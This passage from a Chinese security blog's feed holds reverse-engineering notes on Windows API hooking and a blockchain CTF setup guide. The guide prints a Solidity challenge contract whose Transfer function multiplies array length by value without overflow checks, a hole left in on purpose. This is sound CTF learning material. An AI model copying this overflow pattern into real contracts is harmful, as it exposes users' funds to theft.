src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650001282882.png" alt=""></p><h1 id="0x16-API钩取"><a class="header-anchor" href="#0x16-API钩取">¶</a>0x16-API钩取</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003507541.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003531886.png" alt="钩取流程"></p><p>因为在用户模式下要访问系统资源时，我们没有办法直接访问到，所以为了运行实际的应用程序代码，需要加载许多系统库，也就是DLL</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003724601.png" alt="用户代码访问系统资源"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003764098.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650003805976.png" alt=""></p><p>实际就是对API调用时进行钩取，获得控制权</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004065936.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004108572.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004149588.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004326551.png" alt="实现API钩取的方法"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650004361901.png" alt=""></p><h1 id="0x17-记事本WriteFIle-API钩取"><a class="header-anchor" href="#0x17-记事本WriteFIle-API钩取">¶</a>0x17-记事本WriteFIle()API钩取</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;《逆向工程核心原理》&lt;/p&gt;</summary>
    
    
    
    
    <category term="Book" scheme="https://gift1a.github.io/tags/Book/"/>
    
  </entry>
  
  <entry>
    <title>BlockChain</title>
    <link href="https://gift1a.github.io/2022/04/06/BlockChain/"/>
    <id>https://gift1a.github.io/2022/04/06/BlockChain/</id>
    <published>2022-04-06T12:44:16.000Z</published>
    <updated>2022-04-20T01:22:50.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-环境配置"><a class="header-anchor" href="#0x00-环境配置">¶</a>0x00-环境配置</h1><p><a href="https://www.cnblogs.com/KRDecad3/p/10798383.html">https://www.cnblogs.com/KRDecad3/p/10798383.html</a></p><p>Rinkeby获取测试币网站</p><p><a href="https://faucets.chain.link/rinkeby">https://faucets.chain.link/rinkeby</a></p><p>其他的获取都没啥问题，选择购买-&gt;第二个即可</p><p><img src="/2022/04/06/BlockChain/1649249439831.png" alt=""></p><h1 id="0x01-基础使用"><a class="header-anchor" href="#0x01-基础使用">¶</a>0x01-基础使用</h1><p>可以本地化安装，也可以使用在线网站 <a href="http://remix.ethereum.org">http://remix.ethereum.org</a></p><h2 id="0x00-创建文件"><a class="header-anchor" href="#0x00-创建文件">¶</a>0x00-创建文件</h2><p>按照如下操作创建新文件，名称后缀为.sol</p><p><img src="/2022/04/06/BlockChain/1649250592024.png" alt=""></p><h2 id="0x01-源码编译"><a class="header-anchor" href="#0x01-源码编译">¶</a>0x01-源码编译</h2><p>源代码</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line">contract Trans{</span><br><span class="line">    </span><br><span class="line">    string flag;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    constructor () public {</span><br><span class="line">        //flag = WHAT_YOU_WANT;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    function getBalance() public returns (bool){</span><br><span class="line">        balances[msg.sender] = 100;</span><br><span class="line">        return true;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    function showBalance() public view returns (uint256){</span><br><span class="line">        return balances[msg.sender];</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    function Transfer(address[] _addr, uint256 _value) public returns (bool){</span><br><span class="line">        uint times = _addr.length;</span><br><span class="line">        uint256 amount = uint256(times) * _value;</span><br><span class="line">        require(_value &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount);</span><br><span class="line">        require(times &gt; 0 &amp;&amp; times &lt; 10);</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        for(uint i = 0; i &lt; times; i++){</span><br><span class="line">            balances[_addr[i]] += _value;</span><br><span class="line">        }</span><br><span class="line">        return true;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    function getFlag() public view returns (string){</span><br><span class="line">        require(balances[msg.sender] &gt; 9999999);</span><br><span class="line">        return flag;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>一些说明</p><p>我们选择的COMPILER需要和题目的源码的版本一致</p><p><img src="/2022/04/06/BlockChain/1649250475741.png" alt=""></p><p>然后我选择了自动编译</p><h2 id="0x02-配置题目合约"><a class="header-anchor" href="#0x02-配置题目合约">¶</a>0x02-配置题目合约</h2><p><img src="/2022/04/06/BlockChain/1649251440698.png" alt="一些说明"></p><p>弄好之后点击Deploy即可，然后他会连接并让我们确认支付</p><p>然后这些就是函数</p><p><img src="/2022/04/06/BlockChain/1649251873154.png" alt=""></p><h1 id="0x02-刷题网站"><a class="header-anchor" href="#0x02-刷题网站">¶</a>0x02-刷题网站</h1><p><a href="https://chainflag.org/challenges">https://chainflag.org/challenges</a></p><p>因为智能合约基本是solidity语法，所以需要学习一下</p><p><a href="https://www.jianshu.com/p/70aecda3212e">https://www.jianshu.com/p/70aecda3212e</a></p>]]></content>
    
    
    <summary type="html">BlockChain</summary>
    
    
    
    
    <category term="BlockChain" scheme="https://gift1a.github.io/tags/BlockChain/"/>
    
  </entry>
  
</feed>
